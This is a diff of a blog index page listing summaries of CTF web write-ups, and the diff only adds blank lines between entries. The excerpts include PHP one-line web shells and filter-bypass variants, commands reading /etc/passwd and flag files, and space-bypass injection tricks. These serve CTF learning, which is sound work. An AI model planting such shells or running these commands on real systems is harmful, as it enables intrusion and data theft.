@@ -151,7 +151,11 @@ uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管
 1 2 3 4 app.config[‘SECRET_KEY’] = str(random.random()*100) random.seed(uuid.getnode())	设置随机数种子操作。 python random	生成的数是伪随机数 uuid.</div><div class="post-footer">
         <a href="/buuctf_reinforce_wp/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/awdp/">awdp</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+</article>
+
+
+
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/ctfhub--info_leakage/">ctfhub_信息泄露wp</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
@@ -173,7 +177,11 @@ git log
 1 cat wc.</div><div class="post-footer">
         <a href="/ctfhub--info_leakage/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/wp/">wp</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+</article>
+
+
+
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/ctfshow_deserialize/">ctfshow_deserialize</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
@@ -184,7 +192,11 @@ https://www.runoob.com/php./php-oop.html
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 __wakeup() //执行unserialize()时，先会调用这个函数 __sleep() //执行serialize()时，先会调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 靶场题目：[web254] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 &lt;?</div><div class="post-footer">
         <a href="/ctfshow_deserialize/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+</article>
+
+
+
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/ctfshow_file_include/">ctfshow_file_include</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
@@ -207,7 +219,11 @@ PHP伪协议file://协议file:// 用于访问本地文件系统，在CTF中通�
 1 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。</div><div class="post-footer">
         <a href="/ctfshow_file_include/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+</article>
+
+
+
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/ctfshow_file_upload/">ctfshow_file_upload</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
@@ -217,7 +233,11 @@ CTF文件上传漏洞总结
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 短标签马儿： 一般的马儿： &lt;?php eval（$_POST[&#39;cmd&#39;]);?&gt; 没有PHP的马儿 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;? eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;% eval（$_POST[&#39;cmd&#39;]);%&gt; 有PHP的马儿 &lt;script language=&#34;php&#34;&gt;&lt;/script&gt; 特殊马儿： 过滤[]：用{}代替 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; 直接拿flag的变形马儿 &lt;? echo `tac /var/www/html/f*`;?&gt; &lt;?</div><div class="post-footer">
         <a href="/ctfshow_file_upload/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+</article>
+
+
+
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/ctfshow_rce/">ctfshow_rce</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
@@ -225,7 +245,11 @@ CTF文件上传漏洞总结
 1 2 3 4 5 curl file:///flag strings /flag uniq -c/etc/passwd bash -v /etc/passwd rev /etc/passwd 空格绕过 1 2 3 4 5 6 7 8 &lt; &lt;&gt;	//重定向符 %20	//(space) %09	//(tab) $IFS$9 ${IFS}	//最好用这个 $IFS {cat,flag.</div><div class="post-footer">
         <a href="/ctfshow_rce/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+</article>
+
+
+
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/ctfshow_xxe/">ctfshow_xxe</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
@@ -235,7 +259,11 @@ xml文档结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 &lt;!--XML申明--&gt;
 1 &lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:</div><div class="post-footer">
         <a href="/ctfshow_xxe/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></div></div>
-</article><ul class="pagination"><li class="page-item active">
+</article>
+
+
+
+<ul class="pagination"><li class="page-item active">
                     <span class="page-link">
                         <a href="/">1</a>
                     </span>
